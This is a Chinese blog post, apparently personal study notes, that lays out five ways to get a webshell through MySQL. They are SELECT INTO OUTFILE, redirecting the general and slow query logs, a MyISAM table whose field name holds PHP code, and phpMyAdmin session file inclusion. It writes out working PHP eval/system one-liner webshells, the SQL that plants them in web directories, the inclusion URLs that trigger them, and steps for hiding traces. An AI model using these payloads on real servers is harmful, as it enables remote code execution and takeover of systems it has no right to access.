---
title: "Mysql写入文件 GetShell"
date: "2025-02-05 16:20:31"
updated: "2026-05-30 19:27:39"
categories: ["文章", "学习笔记"]
tags: ["GetShell", "MySQL"]
thumbnail: ""
first_image_as_thumbnail: true
excerpt: ""
after_post: ""
comments: true
wp_id: "558"
---
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">在网络安全渗透测试中，通过数据库写入文件获取服务器 Shell 是一种常见且有效的攻击手段。这种方式的核心在于利用数据库的文件操作权限，将恶意脚本写入 Web 可访问目录，进而实现对服务器的控制。以下详细介绍几种主流的实现方式及操作细节。</div>
<h4 class="header-vfC6AV auto-hide-last-sibling-br">核心前提条件</h4>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">成功通过写入文件获取 Shell，需同时满足三个基础条件，缺一不可：</div>
<ol class="auto-hide-last-sibling-br">
 	<li><strong>数据库最高权限</strong>：需拥有 MySQL 的 root 权限，确保所有操作不受权限限制；</li>
 	<li><strong>已知网站绝对路径</strong>：需明确网站在服务器上的物理路径（如<code>C:/phpStudy/WWW/</code>或<code>/var/www/html/</code>），否则无法定位写入目标；</li>
 	<li><strong>数据库写权限</strong>：MySQL 需对目标 Web 目录有写入权限。MySQL 5.0 + 支持通过变量调整文件写入位置，但最终依赖操作系统对目录的权限配置。</li>
</ol>
<blockquote class="auto-hide-last-sibling-br">
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">注意：Linux 系统因用户权限隔离机制（如 MySQL 运行用户与 Web 服务用户通常不同），权限限制更严格，需确保目标目录允许跨用户写入（如设置 777 权限，实际环境中较少见但存在可能性）。</div></blockquote>
<h4 class="header-vfC6AV auto-hide-last-sibling-br">一、直接写入文件 GetShell</h4>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>适用场景</strong>：<code>secure_file_priv</code>配置允许向目标 Web 目录写入文件时，是最直接高效的方法。</div>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>原理</strong>：利用 MySQL 的<code>SELECT ... INTO OUTFILE</code>语句，直接将包含 PHP 代码的内容写入 Web 目录，生成可执行的恶意脚本。</div>
<h5 class="header-vfC6AV auto-hide-last-sibling-br">特殊前提</h5>
<ul class="auto-hide-last-sibling-br">
 	<li>目标路径不存在同名文件（<code>INTO OUTFILE</code>不支持覆盖已有文件，会直接报错）；</li>
 	<li><code>secure_file_priv</code>参数配置满足写入条件（具体含义见下文）。</li>
</ul>
<h5 class="header-vfC6AV auto-hide-last-sibling-br">操作步骤</h5>
<ol class="auto-hide-last-sibling-br">
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>检查<code>secure_file_priv</code>配置</strong><br class="container-utlnW2 wrapper-d0Cc1k undefined" />该参数控制 MySQL 的文件导入导出权限，执行以下 SQL 查询：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="ywdz3js" data-popupid="ywdz3js"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">show variables like &#039;%secure%&#039;;  # 查看权限限制
</code>
```


</div>
</div>
</div>
</div>
 
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">返回结果对应三种情况：</div>
<ul class="auto-hide-last-sibling-br">
 	<li>值为空：无目录限制，可写入任意路径；</li>
 	<li>值为具体路径（如<code>/tmp/</code>）：仅允许在指定目录写入；</li>
 	<li>值为<code>NULL</code>：禁止所有导入导出操作，此方法不可用。</li>
</ul>
</li>
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>写入 PHP 恶意脚本</strong><br class="container-utlnW2 wrapper-d0Cc1k undefined" />根据服务器操作系统，使用对应路径格式（路径分隔符需转义）：</div>
<ul class="auto-hide-last-sibling-br">
 	<li>Windows 系统（路径用双反斜线<code>\\</code>转义）：
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="ljokny1" data-popupid="ljokny1"></div>
<div class="action-tEcs3i">
<div class="hoverable-sPLxOT" tabindex="0" aria-describedby="vq4w2i7" data-popupid="vq4w2i7"></div>
</div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">select &quot;&lt;?php @eval($_POST[&#039;cmd&#039;]);?&gt;&quot; INTO OUTFILE &quot;d:\\phpstudy\\www\\shell.php&quot;
</code>
```


</div>
</div>
</div>
</div></li>
 	<li>Linux 系统（路径用正斜线<code>/</code>）：
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="0eoogue" data-popupid="0eoogue"></div>
<div class="action-tEcs3i">
<div class="hoverable-sPLxOT" tabindex="0" aria-describedby="rvkpl6h" data-popupid="rvkpl6h"></div>
</div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">select &quot;&lt;?php @eval($_POST[&#039;cmd&#039;]);?&gt;&quot; INTO OUTFILE &quot;/var/www/html/shell.php&quot;
</code>
```


</div>
<div class="mask-wrapper-VgpgeU">
<div class="mask-ZLHDuN"></div>
</div>
</div>
</div>
</div></li>
</ul>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">执行成功后，访问<code>http://目标网站/shell.php</code>，通过 POST 提交<code>cmd</code>参数即可执行命令。</div></li>
</ol>
<h4 class="header-vfC6AV auto-hide-last-sibling-br">二、通过日志文件写入 GetShell</h4>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>适用场景</strong>：<code>secure_file_priv</code>限制严格（如仅允许写入<code>/tmp/</code>），但可修改 MySQL 日志配置时。</div>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>原理</strong>：将 MySQL 的通用日志（记录所有 SQL 操作）路径指向 Web 目录，执行含 PHP 代码的 SQL 语句，利用日志记录功能间接生成恶意脚本。</div>
<h5 class="header-vfC6AV auto-hide-last-sibling-br">特殊前提</h5>
<ul class="auto-hide-last-sibling-br">
 	<li>MySQL 支持动态修改日志配置（大部分版本默认支持，无需重启服务）；</li>
 	<li>目标 Web 目录对 MySQL 运行用户有写入权限。</li>
</ul>
<h5 class="header-vfC6AV auto-hide-last-sibling-br">操作步骤</h5>
<ol class="auto-hide-last-sibling-br">
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>开启通用日志</strong><br class="container-utlnW2 wrapper-d0Cc1k undefined" />MySQL 默认关闭通用日志，需手动开启：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="dhujos9" data-popupid="dhujos9"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">set global general_log = &quot;ON&quot;;  # 开启日志记录功能
</code>
```


</div>
<div class="mask-wrapper-VgpgeU">
<div class="mask-ZLHDuN"></div>
</div>
</div>
</div>
</div></li>
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>查看当前日志路径</strong><br class="container-utlnW2 wrapper-d0Cc1k undefined" />确认默认日志位置，避免覆盖重要文件：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="9pg7bls" data-popupid="9pg7bls"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">show variables like &#039;general%&#039;;  # 结果中general_log_file为当前日志路径
</code>
```


</div>
<div class="mask-wrapper-VgpgeU">
<div class="mask-ZLHDuN"></div>
</div>
</div>
</div>
</div></li>
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>修改日志路径至 Web 目录</strong><br class="container-utlnW2 wrapper-d0Cc1k undefined" />将日志文件指向 Web 可访问目录（替换为实际路径）：</div>
<ul class="auto-hide-last-sibling-br">
 	<li>Windows 示例：
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="gmng2td" data-popupid="gmng2td"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">set global general_log_file = &quot;C:/phpStudy/PHPTutorial/WWW/shell.php&quot;;
</code>
```


</div>
</div>
</div>
</div></li>
 	<li>Linux 示例：
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="qt4gia8" data-popupid="qt4gia8"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">set global general_log_file = &quot;/var/www/html/shell.php&quot;;
</code>
```


</div>
<div class="mask-wrapper-VgpgeU">
<div class="mask-ZLHDuN"></div>
</div>
</div>
</div>
</div></li>
</ul>
</li>
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>写入 PHP 代码</strong><br class="container-utlnW2 wrapper-d0Cc1k undefined" />执行含恶意代码的 SQL 语句，内容会被日志记录：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="wsguwjq" data-popupid="wsguwjq"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">select &quot;&lt;?php @eval($_POST[&#039;cmd&#039;]);?&gt;&quot;;  # 日志文件中将包含该PHP代码
</code>
```


</div>
<div class="mask-wrapper-VgpgeU">
<div class="mask-ZLHDuN"></div>
</div>
</div>
</div>
</div></li>
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>清理痕迹（可选）</strong><br class="container-utlnW2 wrapper-d0Cc1k undefined" />关闭通用日志避免后续操作污染 Shell 文件：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="56kq1r7" data-popupid="56kq1r7"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">set global general_log = &quot;OFF&quot;;  # 关闭日志功能
</code>
```


</div>
<div class="mask-wrapper-VgpgeU">
<div class="mask-ZLHDuN"></div>
</div>
</div>
</div>
</div></li>
</ol>
<h4 class="header-vfC6AV auto-hide-last-sibling-br">三、通过慢查询日志写入 WebShell</h4>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>适用场景</strong>：通用日志配置被限制，但慢查询日志可修改时。</div>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>原理</strong>：慢查询日志用于记录执行时间超过阈值（默认 10 秒）的 SQL 语句。将其路径指向 Web 目录后，通过执行延迟 SQL 语句触发日志记录，写入恶意代码。</div>
<h5 class="header-vfC6AV auto-hide-last-sibling-br">特殊前提</h5>
<ul class="auto-hide-last-sibling-br">
 	<li>慢查询阈值（<code>long_query_time</code>）默认 10 秒，需确保 SQL 执行时间超过该值；</li>
 	<li>目标 Web 目录对 MySQL 用户可写。</li>
</ul>
<h5 class="header-vfC6AV auto-hide-last-sibling-br">操作步骤</h5>
<ol class="auto-hide-last-sibling-br">
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>查看慢查询日志配置</strong><br class="container-utlnW2 wrapper-d0Cc1k undefined" />确认当前状态及默认路径：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="6gpi6qt" data-popupid="6gpi6qt"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">show variables like &#039;%slow%&#039;;  # 关注slow_query_log（状态）和slow_query_log_file（路径）
</code>
```


</div>
<div class="mask-wrapper-VgpgeU">
<div class="mask-ZLHDuN"></div>
</div>
</div>
</div>
</div></li>
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>设置慢查询日志路径</strong><br class="container-utlnW2 wrapper-d0Cc1k undefined" />指向 Web 目录（替换为实际路径）：</div>
<ul class="auto-hide-last-sibling-br">
 	<li>Windows 示例：
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="vq79xny" data-popupid="vq79xny"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">set global slow_query_log_file = &quot;C:/phpStudy/PHPTutorial/WWW/slow_shell.php&quot;;
</code>
```


</div>
<div class="mask-wrapper-VgpgeU">
<div class="mask-ZLHDuN"></div>
</div>
</div>
</div>
</div></li>
 	<li>Linux 示例：
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="yclvoyl" data-popupid="yclvoyl"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">set global slow_query_log_file = &quot;/var/www/html/slow_shell.php&quot;;
</code>
```


</div>
<div class="mask-wrapper-VgpgeU">
<div class="mask-ZLHDuN"></div>
</div>
</div>
</div>
</div></li>
</ul>
</li>
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>开启慢查询日志</strong></div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="bn5yzja" data-popupid="bn5yzja"></div>
<div class="action-tEcs3i">
<div class="hoverable-sPLxOT" tabindex="0" aria-describedby="9um2tf3" data-popupid="9um2tf3"></div>
</div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">set global slow_query_log = &quot;ON&quot;;  # 启用慢查询日志
</code>
```


</div>
<div class="mask-wrapper-VgpgeU">
<div class="mask-ZLHDuN"></div>
</div>
</div>
</div>
</div></li>
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>执行延迟 SQL 写入代码</strong><br class="container-utlnW2 wrapper-d0Cc1k undefined" />通过<code>sleep(10)</code>确保触发慢查询记录：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="2dgrhdf" data-popupid="2dgrhdf"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">select &#039;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#039; from mysql.db where sleep(10);  # 延迟10秒满足阈值
</code>
```


</div>
</div>
</div>
</div></li>
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>清理痕迹（可选）</strong></div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="cdjsuhg" data-popupid="cdjsuhg"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">set global slow_query_log = &quot;OFF&quot;;  # 关闭慢查询日志
</code>
```


</div>
</div>
</div>
</div></li>
</ol>
<h4 class="header-vfC6AV auto-hide-last-sibling-br">四、利用数据库表文件 GetShell</h4>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>适用场景</strong>：<code>secure_file_priv</code>限制严格，但存在文件包含漏洞（如 PhpMyAdmin 自身漏洞）时。</div>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>原理</strong>：MySQL 的 MyISAM 引擎数据表会生成<code>.frm</code>结构文件（存储表结构），通过创建含 PHP 代码的表结构，将恶意代码写入<code>.frm</code>文件，再通过文件包含漏洞执行。</div>
<h5 class="header-vfC6AV auto-hide-last-sibling-br">特殊前提</h5>
<ul class="auto-hide-last-sibling-br">
 	<li>数据库使用 MyISAM 引擎（InnoDB 引擎的<code>.frm</code>文件格式不同，难以直接利用）；</li>
 	<li>存在可利用的文件包含漏洞（如网站脚本的<code>include()</code>函数未过滤路径参数）。</li>
</ul>
<h5 class="header-vfC6AV auto-hide-last-sibling-br">操作步骤</h5>
<ol class="auto-hide-last-sibling-br">
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>创建含恶意代码的数据表</strong><br class="container-utlnW2 wrapper-d0Cc1k undefined" />在目标数据库中创建表，将 PHP 代码嵌入字段名：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="2s0tdqj" data-popupid="2s0tdqj"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">CREATE TABLE `malicious_table` (
  `&lt;?php @eval($_POST[&#039;cmd&#039;]);?&gt;` INT NOT NULL  -- 字段名包含一句话木马
) ENGINE=MyISAM;  -- 必须指定MyISAM引擎
</code>
```


</div>
<div class="mask-wrapper-VgpgeU">
<div class="mask-ZLHDuN"></div>
</div>
</div>
</div>
</div></li>
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>获取数据表文件路径</strong><br class="container-utlnW2 wrapper-d0Cc1k undefined" />执行 SQL 查询数据库存储目录：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="eisnl8r" data-popupid="eisnl8r"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">show variables like &#039;%datadir%&#039;;  # 如Windows：C:/phpStudy/MySQL/data/；Linux：/var/lib/mysql/
</code>
```


</div>
</div>
</div>
</div>
 
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">数据表文件完整路径为：<code>{数据目录}/{数据库名}/malicious_table.frm</code><br class="container-utlnW2 wrapper-d0Cc1k undefined" />示例：<code>C:/phpStudy/MySQL/data/test/malicious_table.frm</code>（Windows）。</div></li>
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>通过文件包含漏洞执行</strong><br class="container-utlnW2 wrapper-d0Cc1k undefined" />构造包含<code>.frm</code>文件的请求：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--plaintext hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="93sfhjn" data-popupid="93sfhjn"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```plaintext
<code class="language-plaintext">http://目标网站/include.php?file=../../MySQL/data/test/malicious_table.frm
</code>
```


</div>
</div>
</div>
</div>
 
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">提交 POST 参数<code>cmd=phpinfo();</code>即可执行命令。</div></li>
</ol>
<h4 class="header-vfC6AV auto-hide-last-sibling-br">五、利用 Session 文件 GetShell</h4>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>适用场景</strong>：针对 PhpMyAdmin 等依赖 Session 的管理工具，且存在文件包含漏洞时。</div>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>原理</strong>：PhpMyAdmin 会将用户操作（如 SQL 查询）记录到 Session 文件中。执行含 PHP 代码的 SQL 语句，恶意代码会被写入 Session 文件，再通过文件包含漏洞调用。</div>
<h5 class="header-vfC6AV auto-hide-last-sibling-br">特殊前提</h5>
<ul class="auto-hide-last-sibling-br">
 	<li>已知 Session 文件存储路径（通常对应 PHP 配置的<code>session.save_path</code>）；</li>
 	<li>存在可包含 Session 文件的漏洞（如 PhpMyAdmin 的<code>target</code>参数文件包含）。</li>
</ul>
<h5 class="header-vfC6AV auto-hide-last-sibling-br">操作步骤</h5>
<ol class="auto-hide-last-sibling-br">
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>写入恶意代码到 Session</strong><br class="container-utlnW2 wrapper-d0Cc1k undefined" />执行含 PHP 代码的 SQL 查询，内容会被记录到当前 Session 文件：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--sql hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="nh002o7" data-popupid="nh002o7"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```sql
<code class="language-sql">select &#039;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#039;  -- 执行后写入Session文件
</code>
```


</div>
</div>
</div>
</div></li>
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>获取 Session ID 与文件路径</strong></div>
<ul class="auto-hide-last-sibling-br">
 	<li><strong>Session ID</strong>：从浏览器 Cookie 中获取（如<code>phpMyAdmin=abc123456</code>，对应 Session 文件名为<code>sess_abc123456</code>）；</li>
 	<li><strong>Session 路径</strong>：通过 PhpMyAdmin 首页的 PHP 信息查看<code>session.save_path</code>，示例：
<ul class="auto-hide-last-sibling-br">
 	<li>Windows：<code>C:/phpStudy/tmp/sess_abc123456</code></li>
 	<li>Linux：<code>/var/lib/php/sessions/sess_abc123456</code></li>
</ul>
</li>
</ul>
</li>
 	<li>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space"><strong>构造包含请求</strong><br class="container-utlnW2 wrapper-d0Cc1k undefined" />利用文件包含漏洞访问 Session 文件：</div>
<div class="relative w-fit custom-code-block-canvas-wrapper w-full">
<div class="code-block-element-YDlfvc light custom-code-block-container--plaintext hide-indicator disable-theme-style custom-code-block-container">
<div class="code-area-tZtDgG code-area" dir="ltr">
<div class="header-wrapper-UnnlXS">
<div class="header-cGu84a">
<div class="title-XQhI4x clickable-eGISjP" tabindex="0" aria-describedby="htqexjr" data-popupid="htqexjr"></div>
</div>
</div>
<div class="content-EGRozu code-content light-scrollbar-TbsSwi">


```plaintext
<code class="language-plaintext">http://目标/phpmyadmin/index.php?target=../../tmp/sess_abc123456&amp;cmd=whoami
</code>
```


</div>
<div class="mask-wrapper-VgpgeU">
<div class="mask-ZLHDuN"></div>
</div>
</div>
</div>
</div></li>
</ol>
<h4 class="header-vfC6AV auto-hide-last-sibling-br">总结</h4>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">通过写入文件获取 Shell 的核心在于 “权限 + 路径 + 写入点” 的结合：</div>
<ul class="auto-hide-last-sibling-br">
 	<li>权限是基础（root 权限 + 目录可写）；</li>
 	<li>路径是关键（需准确知晓 Web 目录或可被包含的文件路径）；</li>
 	<li>写入点是手段（直接写入、日志、表文件、Session 等，根据环境灵活选择）。</li>
</ul>
<div class="auto-hide-last-sibling-br paragraph-JOTKXA paragraph-element br-paragraph-space">实际渗透中，需先通过信息收集确认目标环境的配置（如<code>secure_file_priv</code>、数据库引擎、是否存在文件包含漏洞等），再选择最适配的方法。</div>
